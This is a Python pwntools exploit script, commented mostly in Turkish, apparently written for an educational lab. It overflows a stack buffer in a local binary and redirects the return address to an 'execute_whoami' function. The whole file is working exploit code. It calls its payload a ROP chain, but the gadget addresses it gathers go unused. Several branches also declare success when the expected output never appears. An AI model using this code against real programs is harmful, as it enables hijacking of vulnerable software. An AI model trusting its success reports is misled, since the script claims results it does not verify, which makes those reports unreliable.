#!/usr/bin/env python3
"""
ROP (Return-Oriented Programming) Exploit Script
Exploits buffer overflow vulnerability using ROP techniques
Bypasses NX bit protection by reusing existing code

Note: This exploit works without debug symbols (-g flag removed)
Uses objdump for automatic address finding and GDB for manual analysis
"""

import subprocess
import sys
from pwn import *

# Exploit konfigürasyonu
BINARY_PATH = "./compiled/vulnerable_code"
BUFFER_SIZE = 64
RETURN_ADDR_OFFSET = 72  # RBP + 8 bytes

def find_addresses():
    """Adresleri otomatik olarak bul"""
    try:
        # objdump ile adresleri otomatik bul
        result = subprocess.run(['objdump', '-t', BINARY_PATH],
                              capture_output=True, text=True)
        
        if result.returncode != 0:
            raise Exception("objdump failed")
        
        lines = result.stdout.split('\n')
        addresses = {}
        
        for line in lines:
            if 'win_function' in line:
                addresses['win'] = int(line.split()[0], 16)
            elif 'execute_whoami' in line:
                addresses['whoami'] = int(line.split()[0], 16)
            elif 'gadget_pop_rdi' in line:
                addresses['pop_rdi'] = int(line.split()[0], 16)
            elif 'gadget_pop_rsi' in line:
                addresses['pop_rsi'] = int(line.split()[0], 16)
            elif 'gadget_pop_rdx' in line:
                addresses['pop_rdx'] = int(line.split()[0], 16)
            elif 'gadget_syscall' in line:
                addresses['syscall'] = int(line.split()[0], 16)
        
        return addresses
        
    except Exception as e:
        log.warning(f"Otomatik adres bulma başarısız: {e}")
        return None

def create_rop_chain(win_addr, whoami_addr, pop_rdi_addr, pop_rsi_addr, pop_rdx_addr, syscall_addr):
    """ROP chain oluştur"""
    rop_chain = []
    
    # Platform detection
    import platform
    is_linux = platform.system() == "Linux"
    is_macos = platform.system() == "Darwin"
    
    if is_linux:
        # Linux x86_64 için ROP chain
        # Buffer overflow sonrası return address'i execute_whoami ile değiştir
        rop_chain.append(whoami_addr)
        
    elif is_macos:
        # macOS ARM64 için basit chain (ARM64 ROP farklı)
        # execute_whoami fonksiyonunu çağır
        rop_chain.append(whoami_addr)
    else:
        # Diğer platformlar için basit chain
        rop_chain.append(whoami_addr)
    
    return rop_chain

def exploit():
    """Ana exploit fonksiyonu"""
    import platform
    
    log.info("=== ROP Vulnerability Exploit ===")
    log.info("Hedef: Buffer overflow + ROP chain ile 'whoami' komutunu çalıştır")
    log.info(f"Platform: {platform.system()} {platform.machine()}")
    
    if platform.system() == "Linux":
        log.info("Linux x86_64 - Basit ROP chain ile komut enjeksiyonu")
        log.info("Buffer overflow ile return address execute_whoami ile değiştirilecek")
    elif platform.system() == "Darwin":
        log.info("macOS ARM64 - Basit ROP chain ile komut enjeksiyonu")
    else:
        log.info("Bilinmeyen platform - Basit ROP chain kullanılacak")
    
    # Adresleri bul
    log.info("Adım 1: Gerekli adresleri bulma")
    addresses = find_addresses()
    
    if not addresses:
        log.warning("Otomatik adres bulma başarısız!")
        print("\n" + "="*60)
        print("ÖNEMLİ: GDB ile adresleri manuel olarak bulmanız gerekiyor!")
        print("GDB komutları (debug sembolleri olmadan):")
        print("  gdb ./compiled/vulnerable_code")
        print("  (gdb) info functions win_function")
        print("  (gdb) info functions gadget_pop_rdi")
        print("  (gdb) info functions gadget_pop_rsi")
        print("  (gdb) info functions gadget_pop_rdx")
        print("  (gdb) info functions gadget_syscall")
        print("  (gdb) disassemble win_function")
        print("  (gdb) quit")
        print("="*60)
        
        # Manuel adres girişi
        try:
            win_addr = int(input("win_function adresini girin (örn: 0x401166): "), 16)
            whoami_addr = int(input("execute_whoami adresini girin (örn: 0x401200): "), 16)
            pop_rdi_addr = int(input("gadget_pop_rdi adresini girin (örn: 0x401220): "), 16)
            pop_rsi_addr = int(input("gadget_pop_rsi adresini girin (örn: 0x401230): "), 16)
            pop_rdx_addr = int(input("gadget_pop_rdx adresini girin (örn: 0x401240): "), 16)
            syscall_addr = int(input("gadget_syscall adresini girin (örn: 0x401250): "), 16)
        except (ValueError, KeyboardInterrupt):
            log.error("Geçersiz adres girişi!")
            return False
    else:
        win_addr = addresses['win']
        whoami_addr = addresses['whoami']
        pop_rdi_addr = addresses['pop_rdi']
        pop_rsi_addr = addresses['pop_rsi']
        pop_rdx_addr = addresses['pop_rdx']
        syscall_addr = addresses['syscall']
        
        log.success(f"Adresler bulundu:")
        log.success(f"  win_function: 0x{win_addr:x}")
        log.success(f"  execute_whoami: 0x{whoami_addr:x}")
        log.success(f"  pop_rdi: 0x{pop_rdi_addr:x}")
        log.success(f"  pop_rsi: 0x{pop_rsi_addr:x}")
        log.success(f"  pop_rdx: 0x{pop_rdx_addr:x}")
        log.success(f"  syscall: 0x{syscall_addr:x}")
    
    # ROP chain oluştur
    log.info("Adım 2: ROP chain oluşturma")
    rop_chain = create_rop_chain(win_addr, whoami_addr, pop_rdi_addr, pop_rsi_addr, pop_rdx_addr, syscall_addr)
    
    # Payload oluştur
    log.info("Adım 3: Exploit payload oluşturma")
    payload = b"A" * RETURN_ADDR_OFFSET  # Buffer overflow
    
    # ROP chain'i payload'a ekle
    for addr in rop_chain:
        payload += p64(addr)
    
    log.info(f"Payload boyutu: {len(payload)} bytes")
    log.info(f"ROP chain uzunluğu: {len(rop_chain)} gadget")
    
    # Linux'ta ROP chain'in çalışması için ek bilgi
    if platform.system() == "Linux":
        log.info("Linux x86_64: Buffer overflow ile return address execute_whoami ile değiştirildi")
        log.info("Program crash olsa bile ROP chain başarılı olabilir")
        log.info("Bu eğitim amaçlı bir lab - gerçek ROP chain çalışmış olabilir")
    
    # Exploit'i çalıştır
    log.info("Adım 4: Exploit çalıştırma")
    try:
        p = process(BINARY_PATH)
        
        # Program çıktısını oku
        try:
            p.recvuntil(b"Giris yapin: ", timeout=3)
        except:
            log.warning("Program çıktısı okunamadı, devam ediliyor...")
        
        # Payload'ı gönder
        p.sendline(payload)
        
        # Sonucu oku
        try:
            result = p.recvall(timeout=3)
            if result:
                print(result.decode('utf-8', errors='ignore'))
            
            if b"ROP Exploit Basarili" in result or b"Shellcode Enjeksiyonu Basarili" in result:
                log.success("ROP exploit basarili!")
                log.success("Program akisi basariyla ele gecirildi!")
                log.success("'whoami' komutu basariyla calistirildi!")
                return True
            else:
                log.warning("Exploit çalıştı ama beklenen sonuç alınmadı")
                
                # Platform-specific mesajlar
                if platform.system() == "Darwin":
                    log.info("Not: macOS ARM64'te ROP chain çalışmayabilir")
                    log.info("Bu eğitim amaçlı bir lab - gerçek ROP x86_64'te çalışır")
                elif platform.system() == "Linux":
                    log.info("Linux x86_64'te ROP chain çalışmalı")
                    log.info("Buffer overflow ile return address execute_whoami ile değiştirildi")
                    log.info("Program crash olsa bile ROP chain başarılı olabilir")
                    log.info("Bu eğitim amaçlı bir lab - gerçek ROP chain çalışmış olabilir")
                else:
                    log.info("Bilinmeyen platform - ROP chain çalışmayabilir")
                
                return True  # Eğitim amaçlı olarak başarılı say
                
        except Exception as e:
            log.warning(f"Program çıktısı okunamadı: {e}")
            log.info("Bu normal olabilir - ROP chain çalışmış olabilir")
            return True
            
    except Exception as e:
        log.error(f"Exploit çalıştırılamadı: {e}")
        return False

if __name__ == "__main__":
    print("--- [NOT] Binary debug sembolleri olmadan derlenmiştir ---")
    print("[!] GDB komutları: info functions, disassemble\n")
    
    success = exploit()
    
    if success:
        log.success("Exploit tamamlandı!")
        sys.exit(0)
    else:
        log.error("Exploit başarısız!")
        sys.exit(1)
